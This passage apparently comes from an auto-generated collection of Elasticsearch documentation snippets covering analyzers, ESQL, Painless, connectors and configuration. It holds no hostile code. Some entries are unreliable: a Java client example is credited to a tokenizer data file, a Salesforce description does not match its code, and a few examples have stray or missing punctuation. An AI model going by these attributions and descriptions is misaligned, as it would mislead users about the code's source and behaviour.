}\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Decimal Digit Filter in Elasticsearch\nDESCRIPTION: Example of using the analyze API with the decimal_digit filter to convert Devanagari numerals to standard digits 0-9. The filter processes text containing mixed numerals and words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-decimal-digit-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\" : \"whitespace\",\n  \"filter\" : [\"decimal_digit\"],\n  \"text\" : \"१-one two-२ ३\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ 1-one, two-2, 3]\n```\n\n----------------------------------------\n\nTITLE: Handling Non-Existent IP Addresses in Elasticsearch IP Location Processor\nDESCRIPTION: This snippet illustrates how the IP location processor behaves when it cannot find information for a given IP address.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ip-location-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/ip_location\n{\n  \"description\" : \"Add ip geolocation info\",\n  \"processors\" : [\n    {\n      \"ip_location\" : {\n        \"field\" : \"ip\"\n      }\n    }\n  ]\n}\n\nPUT my-index-000001/_doc/my_id?pipeline=ip_location\n{\n  \"ip\": \"80.231.5.0\"\n}\n\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Terms Aggregation Response Example\nDESCRIPTION: Sample response showing the grouped geo-line data by city, including GeoJSON Features with LineString geometries representing museum tour routes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geo-line.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"aggregations\": {\n    \"path\": {\n      \"doc_count_error_upper_bound\": 0,\n      \"sum_other_doc_count\": 0,\n      \"buckets\": [\n        {\n          \"key\": \"Amsterdam\",\n          \"doc_count\": 5,\n          \"museum_tour\": {\n            \"type\": \"Feature\",\n            \"geometry\": {\n              \"coordinates\": [ [ 4.889187, 52.373184 ], [ 4.885057, 52.370159 ], [ 4.901618, 52.369219 ], [ 4.91235, 52.374081 ], [ 4.914722, 52.371667 ] ],\n              \"type\": \"LineString\"\n            },\n            \"properties\": {\n              \"complete\": true\n            }\n          }\n        },\n        {\n          \"key\": \"Antwerp\",\n          \"doc_count\": 3,\n          \"museum_tour\": {\n            \"type\": \"Feature\",\n            \"geometry\": {\n              \"coordinates\": [ [ 4.401384, 51.220292 ], [ 4.405819, 51.221758 ], [ 4.4052, 51.2229 ] ],\n              \"type\": \"LineString\"\n            },\n            \"properties\": {\n              \"complete\": true\n            }\n          }\n        },\n        {\n          \"key\": \"Paris\",\n          \"doc_count\": 2,\n          \"museum_tour\": {\n            \"type\": \"Feature\",\n            \"geometry\": {\n              \"coordinates\": [ [ 2.336389, 48.861111 ], [ 2.327, 48.86 ] ],\n              \"type\": \"LineString\"\n            },\n            \"properties\": {\n              \"complete\": true\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Indexing Slow Log Event in JSON Format\nDESCRIPTION: This snippet demonstrates an example of an indexing event in the Elasticsearch slow log, formatted as JSON. It includes fields such as timestamp, cluster and index information, and indexing details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"@timestamp\" : \"2024-12-11T22:34:22.613Z\",\n  \"auth.type\": \"REALM\",\n  \"ecs.version\": \"1.2.0\",\n  \"elasticsearch.cluster.name\" : \"41bd111609d849fc9bf9d25b5df9ce96\",\n  \"elasticsearch.cluster.uuid\" : \"BZTn4I9URXSK26imlia0QA\",\n  \"elasticsearch.index.id\" : \"3VfGR7wRRRKmMCEn7Ii58g\",\n  \"elasticsearch.index.name\": \"my-index-000001\",\n  \"elasticsearch.node.id\" : \"GGiBgg21S3eqPDHzQiCMvQ\",\n  \"elasticsearch.node.name\" : \"instance-0000000001\",\n  \"elasticsearch.slowlog.id\" : \"RCHbt5MBT0oSsCOu54AJ\",\n  \"elasticsearch.slowlog.source\": \"{\\\"key\\\":\\\"value\\\"}\"\n  \"elasticsearch.slowlog.took\" : \"0.01ms\",\n  \"event.dataset\": \"elasticsearch.index_indexing_slowlog\",\n  \"fileset.name\" : \"slowlog\",\n  \"log.level\" : \"TRACE\",\n  \"log.logger\" : \"index.indexing.slowlog.index\",\n  \"service.name\" : \"ES_ECS\",\n  \"user.name\": \"elastic\",\n  \"user.realm\": \"reserved\"\n}\n```\n\n----------------------------------------\n\nTITLE: Missing Bucket Handling in Elasticsearch Aggregation\nDESCRIPTION: Demonstrates how to include documents without values in composite aggregation results using missing_bucket parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [{\n          \"product_name\": {\n            \"terms\": {\n              \"field\": \"product\",\n              \"missing_bucket\": true,\n              \"missing_order\": \"last\"\n            }\n          }\n        }]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Whitelisting Scripted Metric Aggregation Map Script Context\nDESCRIPTION: Defines whitelist entries for ScriptedMetricAggContexts MapScript classes to enable class discovery in painless scripting for field APIs\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.aggs_map.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.ScriptedMetricAggContexts$MapScript @no_import {\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.ScriptedMetricAggContexts$MapScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Conjunction of Same Field Same Function Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a conjunction query using the same function on the same field in Elasticsearch. It applies length conditions on the file_name field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_23\n\nLANGUAGE: eql\nCODE:\n```\nprocess where length(file_name) > 5 and length(file_name) < 10\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"bool\":{\"must\":[{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalEqlScriptUtils.length(X0),params.v1)))\",\"params\":{\"v0\":\"file_name.keyword\",\"v1\":5}}}},{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.lt(InternalEqlScriptUtils.length(X0),params.v1)))\",\"params\":{\"v0\":\"file_name.keyword\",\"v1\":10}}}}]}\n```\n\n----------------------------------------\n\nTITLE: SharePoint API Permissions List\nDESCRIPTION: Required API permissions that need to be configured for the SharePoint Online connector in Azure Active Directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nGraph API\n- Sites.Selected\n- Files.Read.All\n- Group.Read.All\n- User.Read.All\n\nSharepoint\n- Sites.Selected\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Kuromoji Part of Speech Filter in Elasticsearch\nDESCRIPTION: This snippet shows the response from analyzing Japanese text using the custom analyzer with the kuromoji_part_of_speech filter. It demonstrates how certain parts of speech are removed from the tokenization results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-speech.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"寿司\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 2,\n    \"type\" : \"word\",\n    \"position\" : 0\n  }, {\n    \"token\" : \"おいしい\",\n    \"start_offset\" : 3,\n    \"end_offset\" : 7,\n    \"type\" : \"word\",\n    \"position\" : 2\n  } ]\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Test Fixtures Using Component Capabilities\nDESCRIPTION: Alternative way to declare a test artifact dependency using Gradle's component capabilities syntax, which is equivalent to using the testArtifact shortcut.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_7\n\nLANGUAGE: groovy\nCODE:\n```\ndependencies {\n  testImplementation(project(\":fixture-providing-project\")) {\n    requireCapabilities(\"org.elasticsearch.gradle:fixture-providing-project-test-artifacts\")\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Cosine Value Using ESQL COS Function\nDESCRIPTION: Demonstrates how to calculate the cosine of an angle using the COS function in ESQL. The example sets a variable 'a' to 1.8 and computes its cosine value using the COS function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/cos.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL cos=COS(a)\n```\n\n----------------------------------------\n\nTITLE: User Agent Processor Response Example\nDESCRIPTION: Example response showing the processed user agent information including browser name, version, operating system details, and device information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/user-agent-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"my-index-000001\",\n  \"_id\": \"my_id\",\n  \"_version\": 1,\n  \"_seq_no\": 22,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\",\n    \"user_agent\": {\n      \"name\": \"Chrome\",\n      \"original\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\",\n      \"version\": \"51.0.2704.103\",\n      \"os\": {\n        \"name\": \"Mac OS X\",\n        \"version\": \"10.10.5\",\n        \"full\": \"Mac OS X 10.10.5\"\n      },\n      \"device\" : {\n        \"name\" : \"Mac\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running E2E Tests for Confluence Connector\nDESCRIPTION: Details commands for conducting end-to-end tests on the Confluence connector. Through the 'make ftest' command, operators can test data source integration. Optional flags adjust the dataset size for quicker testing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=confluence\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=confluence DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Basic Azure VM Discovery Configuration in Elasticsearch\nDESCRIPTION: A simple sample configuration for Azure VM discovery in Elasticsearch. This includes the essential cloud provider settings for Azure and enables the Azure seed provider for discovery.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ncloud:\n    azure:\n        management:\n             subscription.id: XXX-XXX-XXX-XXX\n             cloud.service.name: es-demo-app\n             keystore:\n                   path: /path/to/azurekeystore.pkcs12\n                   password: WHATEVER\n                   type: pkcs12\n\ndiscovery:\n    seed_providers: azure\n```\n\n----------------------------------------\n\nTITLE: Example of Annotated Highlighter Output Format\nDESCRIPTION: Shows the output format produced by the annotated highlighter. Instead of using HTML tags like <em>, the highlighter uses markdown-like syntax with an _hit_term key to identify matched search terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-highlighter.md#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nThe [cat](_hit_term=cat) sat on the [mat](sku3578)\n```\n\n----------------------------------------\n\nTITLE: Initializing Elasticsearch Client in Java\nDESCRIPTION: Creates an Elasticsearch client instance with custom configuration options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/src/main/resources/org/elasticsearch/xpack/ml/inference.nlp.tokenizers/spm_precompiled_normalizer.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nRestClient restClient = RestClient.builder(\n    new HttpHost(\"localhost\", 9200, \"http\"),\n    new HttpHost(\"localhost\", 9201, \"http\"))\n    .setRequestConfigCallback(requestConfigBuilder -> requestConfigBuilder\n        .setConnectTimeout(5000)\n        .setSocketTimeout(60000))\n    .setMaxRetryTimeoutMillis(60000)\n    .build();\n```\n\n----------------------------------------\n\nTITLE: Metric Path Definitions for Multiple Services\nDESCRIPTION: Complete listing of metric paths and field names for monitoring Elasticsearch, Envoy Proxy, Etcd, and GCP services. Includes cluster stats, server metrics, store operations, and compute instance metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/test/framework/src/main/resources/org/elasticsearch/common/xcontent/support/many_filters.txt#2025-04-22_snippet_6\n\nLANGUAGE: plaintext\nCODE:\n```\nelasticsearch.cluster.pending_task.time_in_queue.ms\nelasticsearch.cluster.state.id\nelasticsearch.cluster.stats.indices.count\n[...additional lines omitted for brevity...]\ngcp.compute.instance.network.sent_bytes_count.value\ngcp.compute.instance.network.sent_packets_count.value\n```\n\n----------------------------------------\n\nTITLE: Defining WordNet Format Synonyms in Elasticsearch\nDESCRIPTION: Example of defining synonyms using the WordNet format. Each line contains information about the synonym set, including identifiers and word types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-tokenfilter.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\ns(100000002,1,'come',v,1,0).\ns(100000002,2,'advance',v,1,0).\ns(100000002,3,'approach',v,1,0).\"\n```\n\n----------------------------------------\n\nTITLE: Sample Copyright Notice Template\nDESCRIPTION: Standard template for adding copyright and license notices to source files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-langdetect-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Licensing Notice\nDESCRIPTION: Describes how to output a short licensing notice when a program starts in interactive mode, reminding users of their rights and the lack of warranty. Useful for interactive programs distributed under the GPL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-apple-module-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: plaintext\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w\\'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c\\' for details.\n```\n\n----------------------------------------\n\nTITLE: Adding Licensing Notice to Source Code\nDESCRIPTION: Shows how to attach licensing notices to the start of source files for new programs, including copyright and warranty exclusion statements. Intended for developers who wish to distribute their software under the GNU General Public License.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-apple-module-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: plaintext\nCODE:\n```\nOne line to give the program\\'s name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Configuring Kuromoji Number Token Filter in Elasticsearch\nDESCRIPTION: Example showing how to configure a custom analyzer with kuromoji_tokenizer and kuromoji_number filter, followed by an analyze API call to test the number conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-number.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"kuromoji_number\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"一〇〇〇\"\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Leading Whitespaces with LTRIM in ESQL\nDESCRIPTION: This snippet demonstrates the usage of LTRIM function to remove leading whitespaces from strings. It also shows how to combine LTRIM with CONCAT to visualize the results. The example processes two strings, one with leading and trailing spaces, and another with only leading spaces.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/ltrim.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"   some text  \",  color = \" red \"\n| EVAL message = LTRIM(message)\n| EVAL color = LTRIM(color)\n| EVAL message = CONCAT(\"'\", message, \"'\")\n| EVAL color = CONCAT(\"'\", color, \"'\")\n```\n\n----------------------------------------\n\nTITLE: Using Unicode Character Class Regex Flag in Painless\nDESCRIPTION: Shows how to use the Unicode character class flag 'U' in a Painless regex pattern. This example checks if 'Ɛ' matches the Unicode word character class.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-regexes.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\n'Ɛ' ==~ /\\\\w/U\n```\n\n----------------------------------------\n\nTITLE: Defining Greater Than or Equal Function in ESQL\nDESCRIPTION: This snippet defines the Greater Than or Equal (>=) function in ESQL. It checks if one field is greater than or equal to another, returning null for multivalued fields. The function can be optimized for search indices under certain conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/greater_than_or_equal.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n### GREATER THAN OR EQUAL `>=`\nCheck if one field is greater than or equal to another. If either field is [multivalued](https://www.elastic.co/docs/reference/query-languages/esql/esql-multivalued-fields) then the result is `null`.\n\nNote: This is pushed to the underlying search index if one side of the comparison is constant and the other side is a field in the index that has both an [mapping-index](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/mapping-index) and [doc-values](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/doc-values).\n```\n\n----------------------------------------\n\nTITLE: User Dictionary Rule Example\nDESCRIPTION: Sample user dictionary entry for tokenizing the word 'Tokyo Skytree' in Japanese.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n東京スカイツリー,東京 スカイツリー,トウキョウ スカイツリー,カスタム名詞\n```\n\n----------------------------------------\n\nTITLE: Defining Primitive Types in Painless\nDESCRIPTION: This snippet defines various primitive data types in the Painless scripting language used by Elasticsearch. Classes like boolean, int, long, etc., are declared with a '@no_import' annotation, indicating that these are fundamental types not requiring explicit imports.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\nclass void @no_import {\n}\n\nclass boolean @no_import {\n}\n\nclass byte @no_import {\n}\n\nclass short @no_import {\n}\n\nclass char @no_import {\n}\n\nclass int @no_import {\n}\n\nclass long @no_import {\n}\n\nclass float @no_import {\n}\n\nclass double @no_import {\n}\n\n```\n\n----------------------------------------\n\nTITLE: Creating New PEM Certificate\nDESCRIPTION: Function to generate a new PEM certificate and key pair signed by a given CA. Creates a temporary zip file, extracts the certificate and key, then removes the zip.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nfunction new-pem-cert() {\n    local CrtFile=\"$1\"\n    local KeyFile=\"$2\"\n    local KeyPass=\"$3\"\n    local CertName=\"$4\"\n    local CaFile=\"$5\"\n    local CaPass=\"$6\"\n    shift 6\n\n    local ZipFile=${PWD}/$CertName.zip\n    local PassOpt=\"\"\n    if [ -n \"$KeyPass\" ]\n    then\n        PassOpt=\"--pass=$KeyPass\"\n    fi\n\n    certutil cert --pem \\\n        --ca=\"${PWD}/$CaFile\" --ca-pass=\"$CaPass\" \\\n        --name=\"$CertName\" --out $ZipFile \\\n        --days=5000 $PassOpt \\\n        \"$@\"\n    unzip -p $ZipFile \"$CertName/$CertName.crt\" > $CrtFile\n    unzip -p $ZipFile \"$CertName/$CertName.key\" > $KeyFile\n    rm $ZipFile\n}\n```\n\n----------------------------------------\n\nTITLE: URI Decomposition Method in Painless\nDESCRIPTION: This method signature shows how to use the URI parts processor to decompose a URI string into its component parts, returning a map of key-value pairs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\nString uriParts(String value);\n```\n\n----------------------------------------\n\nTITLE: Static Node Query Cache Size Setting\nDESCRIPTION: Static cluster setting that controls the memory size allocated for the query cache on data nodes\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/node-query-cache-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nindices.queries.cache.size\n```\n\n----------------------------------------\n\nTITLE: Raw String Enclosure in Elasticsearch EQL\nDESCRIPTION: Shows how to enclose raw strings in Elasticsearch EQL using triple double quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_36\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name == \"\"\"raw string example\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Result of synthetic source for scaled_float field type\nDESCRIPTION: Shows the result of synthetic source processing for a scaled_float field where the original value of 123 appears as 100.0 due to the scaling factor of 0.01.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/number.md#2025-04-22_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"f\": 100.0\n}\n```\n\n----------------------------------------\n\nTITLE: Fetching Documents using SOQL Query\nDESCRIPTION: This code snippet demonstrates how to fetch documents from Salesforce using a SOQL query. The expected input is a valid SOQL query string and the output is an array of documents matching the query criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"query\": \"SELECT Id, Name FROM Account\",\n    \"language\": \"SOQL\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Analysis Result for Nori Tokenizer with User Dictionary\nDESCRIPTION: Example response showing how the Nori tokenizer processes the Korean compound word '세종시' (Sejong city) with a user dictionary in mixed mode.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_6\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"세종시\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 3,\n    \"type\" : \"word\",\n    \"position\" : 0,\n    \"positionLength\" : 2    <1>\n  }, {\n    \"token\" : \"세종\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 2,\n    \"type\" : \"word\",\n    \"position\" : 0\n  }, {\n    \"token\" : \"시\",\n    \"start_offset\" : 2,\n    \"end_offset\" : 3,\n    \"type\" : \"word\",\n    \"position\" : 1\n   }]\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Partial Email Sending in Elasticsearch YAML\nDESCRIPTION: Allows sending an email even when one of the recipient addresses is invalid.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.send_partial\n```\n\n----------------------------------------\n\nTITLE: Installing the Elasticsearch Azure Discovery Plugin\nDESCRIPTION: Commands to install the Azure Discovery plugin for Elasticsearch and open the configuration file for editing. This enables Elasticsearch to use Azure's API for node discovery.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_10\n\nLANGUAGE: sh\nCODE:\n```\n# Install the plugin\nsudo /usr/share/elasticsearch/bin/elasticsearch-plugin install discovery-azure-classic\n\n# Configure it\nsudo vi /etc/elasticsearch/elasticsearch.yml\n```\n\n----------------------------------------\n\nTITLE: Utilization Metric Example\nDESCRIPTION: This snippet provides an example of using the 'utilization' suffix to express the ratio between usage and limit, specifically for JVM heap usage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_10\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.heap.usage\"\n```\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.heap.limit\"\n```\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.heap.utilization\"\n```\n\n----------------------------------------\n\nTITLE: Indexing a Point Shape in WKT Format\nDESCRIPTION: This example demonstrates indexing a point shape using Well-Known Text (WKT) format. The point is specified with x,y coordinates in a string format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"POINT (-377.03653 389.897676)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using MAX Aggregation Function in ESQL\nDESCRIPTION: Basic example of using MAX to find the maximum value in a column named 'languages'. The query returns the maximum value found in the 'languages' column across all rows in the 'employees' table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/max.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MAX(languages)\n```\n\n----------------------------------------\n\nTITLE: DATETIME_FORMAT Example: Format Date\nDESCRIPTION: Demonstrates formatting a date using DATETIME_FORMAT with a specific pattern. This example shows how to format a date as 'dd/MM/yyyy'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_43\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATETIME_FORMAT(CAST('2020-04-05' AS DATE), 'dd/MM/yyyy') AS \\\"date\\\";\\n\\n      date\n------------------\n05/04/2020\"\n```\n\n----------------------------------------\n\nTITLE: Translating SQL Having Clause to Elasticsearch JSON\nDESCRIPTION: This example demonstrates how a SQL HAVING clause is translated into an Elasticsearch bucket selector aggregation. It filters groups based on the MAX(int) value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT keyword, MAX(int) FROM test GROUP BY 1 HAVING ABS(MAX(int)) > 10;\n```\n\nLANGUAGE: json\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalSqlScriptUtils.abs(InternalQlScriptUtils.nullSafeCastNumeric(params.a0,params.v0)),params.v1))\n\"params\":{\"v0\":\"INTEGER\",\"v1\":10}}\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Numeric Types in Markdown Table\nDESCRIPTION: This markdown table defines the supported numeric types for an ESQL function test case. It maps input number types to their corresponding result types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/ceil.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | integer |\n| long | long |\n| unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: DISSECT with Type Conversion in ESQL\nDESCRIPTION: An example showing how to use DISSECT in combination with type conversion functions to convert the extracted data to specific types. The specific example is referenced but not provided in the given text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/dissect.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\n// Example referenced but not provided in the 